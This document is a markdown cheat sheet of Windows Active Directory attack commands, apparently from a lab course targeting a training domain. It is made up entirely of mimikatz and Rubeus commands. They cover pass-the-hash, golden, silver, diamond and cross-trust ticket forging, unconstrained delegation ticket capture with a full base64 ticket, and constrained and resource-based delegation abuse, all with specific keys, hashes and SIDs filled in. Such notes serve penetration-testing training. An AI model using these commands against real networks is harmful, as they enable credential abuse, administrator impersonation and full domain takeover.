# Tickets

## Pass The Hash
```
C:\AD\Tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:dollarcorp.moneycorp.local /user:ciadmin /aes256:1bbe86f1b5285109dd1450b55ed8851c220b81cc187f9af64e4048ed25083879 /run:cmd" "exit"
```

## Golden Ticket

Access Filesistem:
```
C:\AD\Tools\mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848  /sid:S-1-5-21-719815819-3726368948-3917688648 /startoffset:0 endin:600 /renewmax:10080 /ptt" "exit"
```
```
Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 endin:600 /renewmax:10080 /ptt"'
```

## Silver Ticket

Access HOST (schtask)
```
C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
Access WMI:
```
C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
```
C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

## Golden Ticket intra-forest domain
```
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:d27fb7ee4e34dd921cdb629eb2b25777 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\trust_moneycorp.kirbi
```
```
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\trust_moneycorp.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

## Diamon Ticket

```
C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Unconstrained Delegation

```
C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
```
C:\AD\Tools\Rubeus.exe ptt /ticket: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
```

## Constrained Delegation
Impersonate for user:
```
PS C:\Users\student162> Get-DomainUser -TrustedToAuth | select name, msds-allowedtodelegateto

name    msds-allowedtodelegateto
----    ------------------------
web svc {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}

C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```
Impersonate for computers:
```
 Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

name           msds-allowedtodelegateto
----           ------------------------
DCORP-ADMINSRV {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}

C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:HTTP /ptt
```
## Constrained Delegation Base Resource

```
PS C:\Users\Administrator\.jenkins\workspace\Project0> Set-DomainRBCD -Verbose -Identity dcorp-mgmt -DelegateFrom DCORP-STD162$
```
```
PS C:\Users\Administrator\.jenkins\workspace\Project0> Get-DomainRBCD -Verbose
```
```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:dcorp-std162$ /aes256:732b0bcff73f3658d123866dee2395b0085603cec814d990c9c04c461c7fb5a4 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```